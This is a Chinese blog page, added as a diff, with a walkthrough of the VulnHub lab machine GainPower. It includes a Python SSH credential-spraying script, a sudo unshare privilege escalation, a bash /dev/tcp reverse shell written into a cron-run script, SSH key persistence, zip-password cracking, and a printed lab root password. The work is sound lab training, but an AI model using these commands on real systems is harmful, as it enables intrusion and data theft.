@@ -1,0 +1,87 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="GainPower-vulnhub渗透测试"><meta name="keywords" content="靶机渗透"><meta name="author" content="我是小吴啦"><meta name="copyright" content="我是小吴啦"><title>GainPower-vulnhub渗透测试 | Chen's Blog</title><link rel="shortcut icon" href="/4.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  }
+} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#渗透过程"><span class="toc-number">2.</span> <span class="toc-text">渗透过程</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">我是小吴啦</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">80</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">7</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://jagger2zr.com" target="_blank" rel="noopener">Jagger</a><a class="author-info-links__name text-center" href="https://mochazz.github.io" target="_blank" rel="noopener">mochazz学长</a><a class="author-info-links__name text-center" href="https://www.cnblogs.com/bflw/" target="_blank" rel="noopener">强哥</a><a class="author-info-links__name text-center" href="http://p0desta.com/" target="_blank" rel="noopener">p0desta</a><a class="author-info-links__name text-center" href="https://github.com/Bypass007" target="_blank" rel="noopener">Bypass师傅</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1587989465494&amp;di=25bf7ddc1982d8dbb238d7a90a78781e&amp;imgtype=0&amp;src=http%3A%2F%2Fimgs.aixifan.com%2Fo_1c8epo34e1nji18d3hn917iv1rha65.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Chen's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">GainPower-vulnhub渗透测试</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-07-12</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>GainPower-靶机渗透</p>
+<a id="more"></a>
+
+<p>靶机IP：192.168.1.158</p>
+<p>KaLiIP：192.168.1.76</p>
+<p>考点：</p>
+<p>ssh脚本自动化登陆</p>
+<p>unshare命令理解，pspy64使用，定时脚本反弹shell</p>
+<p>生成ssh密钥对，密钥登陆ssh，scp使用</p>
+<p>爆破zip密码</p>
+<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><p>nmap扫描</p>
+<p><img src="/2020/07/12/GainPower-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1.png" alt="image-20200705232953859"></p>
+<p>这里扫描出一个ssh服务，还有一个80端口和8000端口开放</p>
+<p>访问80端口，没有找到可用信息，因为这里的页面都是静态页面</p>
+<p><img src="/2020/07/12/GainPower-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.png" alt="image-20200712175042221"></p>
+<p>然后访问8000端口</p>
+<p><img src="/2020/07/12/GainPower-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/3.png" alt="image-20200712175211460"></p>
+<p>这里是个控制台，但是我们不晓得账号和密码，暂时先放着…..</p>
+<p>看到ssh服务，尝试登陆</p>
+<p><img src="/2020/07/12/GainPower-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.png" alt="image-20200712175318165"></p>
+<p>提示，有employee1,employee2等用户，尝试登陆</p>
+<p><img src="/2020/07/12/GainPower-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/5.png" alt="image-20200712175654102"></p>
+<p>然后登陆<code>employee1:employee1</code>，发现这里有超级多的账户</p>
+<p><img src="/2020/07/12/GainPower-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/6.png" alt="image-20200712185553669"></p>
+<p>一个个试过去，发现<code>employee64</code>有搞头，后来看了别人的思路，这里可以通过写脚本，来自动化</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuckme</span><span class="params">(seraeste)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> seraeste</span><br><span class="line">    l_user=seraeste</span><br><span class="line">    l_password=seraeste</span><br><span class="line">    l_host=<span class="string">"192.168.1.158"</span></span><br><span class="line">    ssh = paramiko.SSHClient()</span><br><span class="line">    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    ssh.connect(l_host,username=l_user,password=l_password)</span><br><span class="line">    transport = ssh.get_transport()</span><br><span class="line">    session = transport.open_session()</span><br><span class="line">    session.set_combine_stderr(<span class="literal">True</span>)</span><br><span class="line">    session.get_pty()</span><br><span class="line"></span><br><span class="line">    session.exec_command(<span class="string">"sudo -l"</span>)</span><br><span class="line">    stdin = session.makefile(<span class="string">'wb'</span>,<span class="number">-1</span>)</span><br><span class="line">    stdout=session.makefile(<span class="string">'rb'</span>,<span class="number">-1</span>)</span><br><span class="line">    stdin.write(l_password+<span class="string">'\n'</span>)</span><br><span class="line">    stdin.flush()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> stdout.read().splitlines():</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'host: %s: %s:'</span>%(l_host, line)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">    employ = <span class="string">'employee'</span>+str(x)</span><br><span class="line">    fuckme(employ)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/12/GainPower-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/7.png" alt="image-20200712185933569"></p>
+<p>关于unshare</p>
+<p><img src="/2020/07/12/GainPower-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/8.png" alt="image-20200712190853926"></p>
+<p><code>employee64</code>可以在<code>programmer</code>用户下免密使用<code>unshare</code></p>
+<p>这里使用unshare启动一个新的进程</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u programmer /usr/bin/unshare /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/12/GainPower-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/9.png" alt="image-20200712191741609"></p>
+<p>然后查看id，可以看到<code>programmer</code>在<code>prome</code>组下</p>
+<p>查看该工作组拥有的功能权限</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -group prome <span class="number">2</span>&gt;/dev/<span class="keyword">null</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/12/GainPower-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/10.png" alt="image-20200712191920075"></p>
+<p>使用wget向靶机上传<code>pspy64</code>,使用<code>pspy64</code>查看进程运行情况</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="comment">//192.168.1.76/pspy64</span></span><br><span class="line">./pspy64</span><br></pre></td></tr></table></figure>
+
+<p>看到这里会定时执行<code>backup.sh</code></p>
+<p><img src="/2020/07/12/GainPower-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/11.png" alt="image-20200712192357306"></p>
+<p>所以我们可以修改<code>backup.sh</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi /bin/bash /media/programmer/scripts/backup.sh </span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">192.168</span><span class="number">.1</span><span class="number">.76</span>/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/12/GainPower-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.png" alt="image-20200712192727081"></p>
+<p>kali监听端口</p>
+<p><img src="/2020/07/12/GainPower-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/13.png" alt="image-20200712193037989"></p>
+<p>在目录里有一个<code>secret.zip</code>，想要把这个文件发送到kali上</p>
+<p><img src="/2020/07/12/GainPower-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/14.png" alt="image-20200712193222615"></p>
+<p>师傅教我用<code>ssh登陆该用户，利用scp将其发送出来</code></p>
+<p>因为发现这里有<code>.ssh</code>文件，并且这里的ssh服务是允许远程登录的，虽然我们不知道ssh登陆的密码，但是我们可以生成密钥对，使用密钥登陆，生成用户<code>c0okb:cookie123</code></p>
+<p>生成密钥对参考：<a href="https://www.runoob.com/w3cnote/set-ssh-login-key.html" target="_blank" rel="noopener">https://www.runoob.com/w3cnote/set-ssh-login-key.html</a></p>
+<p><img src="/2020/07/12/GainPower-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/15.png" alt="image-20200712194340553"></p>
+<p>然后我们在Kali中使用密钥登陆，参考：CengBox2-vulnhub渗透测试</p>
+<p><img src="/2020/07/12/GainPower-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/16.png" alt="image-20200712194656148"></p>
+<p>使用scp传送</p>
+<p><img src="/2020/07/12/GainPower-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/17.png" alt="image-20200712195124507"></p>
+<p><img src="/2020/07/12/GainPower-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/18.png" alt="image-20200712195158612"></p>
+<p>解密<code>secret.zip</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt secret.zip</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/12/GainPower-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/19.png" alt="image-20200712195257256"></p>
+<p><img src="/2020/07/12/GainPower-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/20.png" alt="image-20200712195529485"></p>
+<p>然后访问到8000端口</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:root</span><br><span class="line">password:aTQ!vYxQUh3$&amp;uaN3p%@_ax<span class="comment">#Ab2XNZ!5$rFh$@bDMyxt#&amp;Q2L&amp;4+DvDT?A!MPKK9sFq-V8_d$5gQLKyKhf-4&amp;S=_m^Cx?bZYf8Bv%%*H^GcvDc4ayfPk^HWs8bnD%Ayk3$5WP6_K?a6_%MF&amp;e-DS2ZZ$m93BL3CY!huQDM2-JZcMSMKT8K*Z7zLPGATU7JP&amp;x#JtaZHAbM^%$TK%C3ubXV4#e87M6P-puXTTMbzuP5y4qX6Uzd%ed8Ux_vMX=pCB</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2020/07/12/GainPower-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/21.png" alt="image-20200712195807236"></p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">我是小吴啦</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2020/07/12/GainPower-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">http://yoursite.com/2020/07/12/GainPower-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/">靶机渗透</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/07/15/my-cmcms-vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="fa fa-chevron-left">  </i><span>my-cmcms-vulnhub渗透测试</span></a></div><div class="next-post pull-right"><a href="/2020/07/05/something-terrible-about-me/"><span>something terrible about me</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1587989465494&amp;di=25bf7ddc1982d8dbb238d7a90a78781e&amp;imgtype=0&amp;src=http%3A%2F%2Fimgs.aixifan.com%2Fo_1c8epo34e1nji18d3hn917iv1rha65.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By 我是小吴啦</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script></body></html>
